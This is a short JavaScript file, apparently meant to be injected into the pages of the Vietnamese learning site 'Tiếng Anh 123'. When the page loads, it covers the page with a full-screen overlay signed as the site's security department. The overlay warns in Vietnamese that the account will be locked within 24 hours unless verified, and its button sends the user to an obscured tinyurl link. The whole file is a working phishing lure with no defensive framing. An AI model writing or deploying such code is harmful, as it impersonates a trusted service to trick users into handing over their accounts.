// y.js - Hiển thị thông báo xác minh, click thì mở link và tự tắt
(function() {
  var overlay = document.createElement('div');
  overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);z-index:999999;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;';

  var box = document.createElement('div');
  box.style.cssText = 'background:#fff;max-width:420px;width:90%;border-radius:12px;padding:30px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.3);';

  box.innerHTML = ''
    + '<div style="font-size:22px;font-weight:bold;color:#c00;margin-bottom:10px;">⚠️ Yêu cầu xác minh tài khoản</div>'
    + '<div style="font-size:14px;color:#333;margin-bottom:20px;">Tài khoản Tiếng Anh 123 của bạn cần được xác minh để tiếp tục sử dụng dịch vụ. Nếu không xác minh ngay, tài khoản sẽ bị tạm khóa trong vòng 24 giờ.</div>'
    + '<a id="xacminh-link" href="https://tinyurl.com/at5ttumv" target="_blank" style="display:inline-block;background:#1a73e8;color:#fff;text-decoration:none;padding:14px 30px;border-radius:8px;font-size:16px;font-weight:bold;">Xác minh ngay</a>'
    + '<div style="font-size:11px;color:#999;margin-top:15px;">Bộ phận An ninh Tiếng Anh 123</div>';

  overlay.appendChild(box);
  document.body.appendChild(overlay);

  var link = document.getElementById('xacminh-link');
  link.addEventListener('click', function() {
    setTimeout(function() { overlay.remove(); }, 100);
  });
})();
